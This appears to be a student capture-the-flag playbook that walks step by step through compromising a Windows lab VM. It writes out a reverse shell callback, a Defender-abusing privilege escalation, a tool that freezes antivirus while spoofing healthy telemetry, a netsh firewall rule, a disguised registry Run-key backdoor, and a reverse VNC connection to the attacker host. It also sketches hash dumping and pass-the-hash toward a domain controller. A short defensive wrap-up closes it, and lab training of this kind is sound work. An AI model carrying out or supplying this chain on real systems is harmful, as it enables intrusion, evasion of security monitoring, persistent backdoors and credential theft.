# The Master CTF Execution Playbook
**The Ultimate Attack Chain: From Phish to VNC Flag Capture**

This is your definitive guide for the final class demonstration. It strings together Semester 1 and Semester 2 into a flawless, realistic Red Team operation.

---

## ðŸ›‘ WHAT IS MISSING? (Pre-Engagement Setup)
Before you start your presentation, you must have these files compiled and staged on your Host Machine, ready to be transferred or downloaded by the Lab VM:

1.  **`rev_shell.exe`**: Your compiled Semester 1 Reverse TCP shell.
2.  **`RedSun.exe`**: Your compiled Semester 2 privilege escalation exploit.
3.  **`UnDefend.exe`**: Your compiled Semester 1 Defender DoS/Spoofer (in Aggressive Mode).
4.  **`vncserver.exe`**: A portable VNC server executable (like TightVNC or UltraVNC). You must download this from the internet, as it is not included in your codebase.
5.  **`CTF_VNC_Head.py`**: The Python Command & Control script running on your Host.

*(Note: If you are doing a physical-access scenario, **YellowKey** replaces Step 1. You boot into WinRE, drop the shell into the Windows Startup folder, and reboot.)*

---

## ðŸ”— THE ATTACK CHAIN (Step-by-Step)

### STEP 1: The Initial Foothold
* **WHAT:** Establish a command-line connection between the Lab VM and your Host Machine.
* **WHY:** You need an interactive shell to execute your advanced exploits. At this stage, you only have "Standard User" privileges.
* **HOW:**
    1.  **On Host:** Run `python CTF_VNC_Head.py` and enter your listening port (e.g., 4444).
    2.  **On VM:** The victim (role-played by you or the teacher) double-clicks `rev_shell.exe`.
    3.  **Result:** Your Python script catches the shell. You are now inside the VM.

### STEP 2: Privilege Escalation (RedSun)
* **WHAT:** Escalate privileges from Standard User to `NT AUTHORITY\SYSTEM`.
* **WHY:** You cannot open firewall ports or install persistent VNC backdoors without Administrator privileges. RedSun is chosen because it directly overwrites a service and grants an instant `SYSTEM` shell.
* **HOW:**
    1.  **On VM Shell:** Ensure `RedSun.exe` is in the `%TEMP%` folder.
    2.  **On Host (Python C2):** Type the macro `deploy_redsun`.
    3.  **The Magic:** RedSun creates an EICAR file, waits for Defender to see it, and then swaps the directory with a Junction pointing to `System32`. Defender blindly writes a malicious service binary into `System32`. The service starts.
    4.  **Result:** Your shell is elevated to `SYSTEM`.

### STEP 3: Defense Evasion (UnDefend)
* **WHAT:** Blind the Endpoint Detection and Response (EDR) and completely freeze Windows Defender.
* **WHY:** Dropping a VNC server to disk and modifying the Windows Firewall is extremely "noisy." A good EDR will catch you. **Crucial Timing:** You *must* run this AFTER RedSun, because RedSun needs Defender to be awake to do the overwrite. Now that you have `SYSTEM`, you freeze Defender so it can't stop your next steps.
* **HOW:**
    1.  **On VM Shell:** Execute `UnDefend.exe`.
    2.  **The Magic:** UnDefend modifies the `mpavbase.vdm` metadata to read "Version 99.99.9999", spoofing the EDR web console into thinking the machine is perfectly safe. It then applies a Sharing Violation Lock, causing the actual Defender engine to permanently freeze.
    3.  **Result:** The AV is dead. The SOC console shows it as healthy. You are invisible.

### STEP 4: Network Pivot & Persistence
* **WHAT:** Open port 5900 on the firewall and establish a persistent registry key for VNC.
* **WHY:** You need a graphical interface (VNC) to browse the desktop and click on the flag. You also want this VNC server to start automatically if the teacher reboots the VM.
* **HOW:**
    1.  **On VM Shell:** Ensure `vncserver.exe` is dropped into `C:\ProgramData\`.
    2.  **On Host (Python C2):** Type the macro `open_firewall`. (This runs `netsh` to punch a hole for port 5900).
    3.  **On Host (Python C2):** Type the macro `persist_vnc`. (This writes `vncserver.exe` to the `HKLM\...\Run` registry key).
    4.  **Result:** The VM is now primed to accept and send VNC connections, and the backdoor will survive a reboot.

### STEP 5: Actions on Objectives (VNC Flag Capture)
* **WHAT:** Connect to the VM's graphical desktop and capture the flag.
* **WHY:** This is the ultimate objective of the CTF and the visual finale of your presentation.
* **HOW:**
    1.  **On Host:** Open your VNC Viewer application (e.g., TightVNC Viewer) in "Listening Mode" on port 5500. (`vncviewer -listen 5500`)
    2.  **On Host (Python C2):** Type the macro `start_vnc`. The Python script will ask for your Host IP address.
    3.  **The Magic:** The Python script commands the hidden `vncserver.exe` on the VM to shoot a reverse-VNC connection straight through the firewall back to your Host machine.
    4.  **Result:** A window pops up on your Host machine showing the VM's desktop. Navigate to the Administrator's desktop, open `flag.txt`, and conclude the demonstration.

---

### End of Presentation Narrative
*"By combining a basic socket foothold, I utilized a TOCTOU flaw in Windows Defender (RedSun) to escalate to SYSTEM. Before deploying my noisy VNC backdoor, I utilized Sharing Violation Splitting (UnDefend) to permanently blind the AV engine while spoofing healthy telemetry to the EDR. With the defenses down, I opened the firewall, established registry persistence, and popped a reverse graphical shell to capture the flag."*
---

## ??? WHY DOESN'T DEFENDER STOP THIS? (Defense Evasion Breakdown)
If the instructor asks how you are bypassing Windows Defender (WD) without triggering immediate alerts, explain the following:

**1. The Reverse Shell (
ev_shell.exe)**
A basic, unencrypted reverse shell compiled directly from standard C sockets is often **not** immediately detected by Defender when just sitting on disk. Because standard network connections are used by thousands of legitimate programs, a custom-compiled C shell will often slip right past the initial static scan (unlike highly fingerprinted payloads like Metasploit).

**2. RedSun (RedSun.exe) - Using Defender Against Itself**
Defender isn't bypassed here; it is actively weaponized. RedSun.exe drops a fake text file containing the EICAR string (a harmless test string that all AVs immediately flag). Defender sees the EICAR string and rushes in to quarantine it. While Defender is distracted trying to "fix" the file, RedSun.exe swaps the folder underneath it. Defender isn't detecting your exploit; your exploit is judo-throwing Defender by abusing its remediation logic.

**3. UnDefend (UnDefend.exe) - Blinding the Watchman**
Once you have SYSTEM privileges from RedSun, you run UnDefend.exe. You aren't writing a virus to disk; you are manipulating OS File Locks. UnDefend places a Sharing Violation Lock on the exact files Windows Defender needs to download updates, and it spoofs the metadata to lie to the cloud console. Once UnDefend runs, Defender is permanently frozen and blind.

**4. VNC Server (ncserver.exe)**
VNC is a legitimate remote administration tool used by IT departments (e.g., TightVNC, RealVNC). It is not malware. Furthermore, because you ran UnDefend in the previous step, Windows Defender is completely paralyzed anyway. You could drop the most famous malware in the world onto the disk at this point, and Defender wouldn't make a sound.

---

# APPENDIX: CTF Runbook — Phase-by-Phase Demo Script


## Objective
This runbook serves as the master script for your final project demonstration. It weaves together the foundational concepts of Semester 1 and the advanced exploitation concepts of Semester 2. 

**The Scenario:** You (the Red Team Threat Actor) are operating from your Host Machine. Your objective is to breach the target Lab VM, escalate privileges, enumerate the environment, establish a persistent VNC connection, and capture the flag.

---

## Phase 1: The Initial Foothold (Semester 1)
*â€œGaining the initial entry into the system.â€*

**The Concept:**
Before advanced exploits can be run, an attacker needs a basic shell. In Semester 1, we explored how standard networking APIs (Sockets) can be abused to create a Reverse TCP Shell.

**The Demonstration Execution:**
1. On your Host Machine, start a listener (e.g., using Netcat): `nc -lvnp 4444`
2. On the Lab VM (acting as the victim who clicked a phishing link), execute the `rev_shell.exe` payload compiled during Semester 1.
3. **Result:** You receive a connection back to your Host Machine. You now have a command prompt on the VM, but it is running as a low-privileged **Standard User**. You cannot install VNC or access restricted flags yet.

---

## Phase 2: Privilege Escalation (Semester 2)
*â€œMoving from a low-privileged user account to administrator or root access.â€*

**The Concept:**
To install a VNC server and capture the administrative flag, you need `SYSTEM` privileges. We will use the **RedSun** vulnerability (Time-of-Check to Time-of-Use / Arbitrary File Overwrite) to achieve this.

**The Demonstration Execution:**
1. Through your low-privileged reverse shell, upload the compiled `RedSun.exe` to the VM's `%TEMP%` directory.
2. Execute `RedSun.exe`. 
3. *Role-Play Narrative:* Explain to the class that you are creating a fake `EICAR` virus to bait Windows Defender. When Defender tries to quarantine it, your script swaps the directory with a junction pointing to `C:\Windows\System32`. Defender blindly writes a malicious service binary into System32.
4. **Result:** The malicious service starts. Your shell is elevated to `NT AUTHORITY\SYSTEM`. You now own the machine.

---

## Phase 3: Network Exploration & Enumeration
*â€œAssessing the compromised environment to understand its architecture and critical assets.â€*

**The Concept:**
Now that you have `SYSTEM` privileges, you must map out the territory before establishing a backdoor.

**The Demonstration Execution:**
From your elevated shell, run standard enumeration commands to survey the landscape:
*   `whoami /priv` *(Proves you have full administrative rights)*
*   `ipconfig /all` *(Identifies the internal IP address of the VM for your VNC connection)*
*   `netstat -ano` *(Checks what ports are currently open and identifies potential firewalls)*
*   `tasklist /v` *(Lists running processes to ensure no Blue Team tools are actively hunting you)*

---

## Phase 4: Persistence & VNC Flag Capture
*â€œCreating backdoors to maintain access and establishing graphical control.â€*

**The Concept:**
Command-line access is good, but graphical access (VNC/RDP) is better for navigating a user's desktop to steal sensitive files (the "Flag"). Persistence ensures that even if the VM is rebooted, you retain your VNC access.

**The Demonstration Execution:**
1. **Firewall Manipulation:** Because you are `SYSTEM`, you can force the firewall to allow VNC traffic (Port 5900).
   ```cmd
   netsh advfirewall firewall add rule name="VNC_Backdoor" dir=in action=allow protocol=TCP localport=5900
   ```
2. **VNC Installation/Execution:** Silently drop a portable VNC server (like TightVNC or UltraVNC portable) via your shell to a hidden directory (`C:\ProgramData\`).
3. **Persistence (Registry Run Key):** Ensure the VNC server starts automatically every time the machine boots.
   ```cmd
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "C:\ProgramData\vncserver.exe -run" /f
   ```
4. **The Flag Capture:** 
   * On your Host Machine, open a VNC Viewer.
   * Type in the Lab VM's IP address (discovered during Phase 3).
   * **Result:** You will connect directly to the VM's graphical desktop. You can now navigate to the Administrator's desktop and open the `flag.txt` file.

---

## Phase 5: Lateral Movement (Theoretical Discussion)
*â€œPivoting from the compromised host to adjacent machines.â€*

**The Concept:**
To finish the role-play, explain what the threat actor would do next. Having captured this VM, the attacker wants the rest of the network.

**The Demonstration Execution:**
Reference the **BlueHammer** project from Semester 2.
1. Explain that because you are `SYSTEM`, you can dump the SAM (Security Account Manager) database hashes.
2. Using the LSA manipulation techniques from BlueHammer, you can extract the NTLM hashes of the Domain Administrators who previously logged into this VM.
3. You can then perform a "Pass-the-Hash" attack to laterally move to the Domain Controller, completing a total network compromise.

---

### Blue Team Wrap-Up (Defensive Value)
Conclude your presentation by explaining how the company could have stopped you at every phase:
*   **Phase 1:** EDR should have blocked the unusual network socket creation originating from a standard user process.
*   **Phase 2:** Defender needed strict file-path resolution to prevent the TOCTOU Junction attack (RedSun).
*   **Phase 4:** The SIEM should have triggered a critical alert when a new firewall rule was added via `netsh` or when an unknown binary was added to the `HKLM\...\Run` registry key.

---

# APPENDIX: Foothold & VNC Setup


This guide covers the two network-facing components of your CTF Attack Chain: The initial Reverse TCP Shell (`rev_shell.c`) and the Graphical Backdoor (`vncserver.exe`).

---

## Part 1: The Windows Reverse TCP Shell
The file `rev_shell.c` located in your CSEC folder is a custom-written Windows C payload. It uses the `Winsock2` API to silently bind a `cmd.exe` prompt to a network connection and ship it back to your Host machine.

### Step 1: Configure Your IP Address
Before compiling, the shell must know where to "call home."
1. Find the IP address of your Host Machine (the machine running the Python C2 script).
   * Open `cmd` and type `ipconfig`. Look for your IPv4 address (e.g., `192.168.x.x`).
2. Open `rev_shell.c` in Notepad or your preferred text editor.
3. Locate **Line 22**:
   ```c
   attacker_addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // <--- EDIT THIS LINE
   ```
4. Replace `"192.168.1.100"` with your actual Host IP address.
5. Save the file.

### Step 2: Compile the Shell
1. Open the **Developer Command Prompt for VS**.
2. Navigate to your CSEC workspace:
   ```cmd
   cd C:\Users\gwu07\Desktop\CSEC
   ```
3. Compile the C code, ensuring you link the required Windows Sockets library (`ws2_32.lib`):
   ```cmd
   cl.exe rev_shell.c /link ws2_32.lib
   ```
4. **Result:** You will now have a `rev_shell.exe` file. This is the bait you will deploy on the Lab VM to gain your initial foothold.

---

## Part 2: The VNC Backdoor (Living Off The Land)
Writing a custom VNC server from scratch requires thousands of lines of complex graphics driver code. In real-world Red Teaming, attackers use a technique called "Bring Your Own Tool" (BYOT). Because you are using `UnDefend.exe` to completely blind Windows Defender, you can drop any legitimate IT administration tool onto the target and it will not be flagged.

### Step 1: Sourcing the VNC Server
You need a "Portable" or "Standalone" VNC server. This means the executable runs instantly without requiring an installer wizard.
1. Download a legitimate, portable VNC server to your Host Machine. Good options include:
   * **TightVNC** (Look for the portable/standalone version)
   * **UltraVNC** (Often provides a raw `.exe` without an installer)
2. Once downloaded, rename the server executable to exactly: **`vncserver.exe`**
   *(Note: The Python C2 script relies on this exact filename).*

### Step 2: Sourcing the VNC Viewer
To watch the stream, you need the client application on your Host machine.
1. Download the corresponding VNC Viewer (e.g., TightVNC Viewer).
2. Install or extract it to your Host Machine.

### Step 3: Execution Logic (How it connects during the CTF)
During Phase 4 of your presentation:
1. You will start your VNC Viewer on your Host machine in "Listening Mode".
   *(Usually by running a command like `vncviewer.exe -listen 5500` or using the GUI).*
2. Using the Python C2 macro `start_vnc`, your script will command the VM to run:
   `C:\ProgramData\vncserver.exe -connect <Your_Host_IP>::5500`
3. The VM will punch out through the firewall and deliver its screen directly to your waiting Viewer.
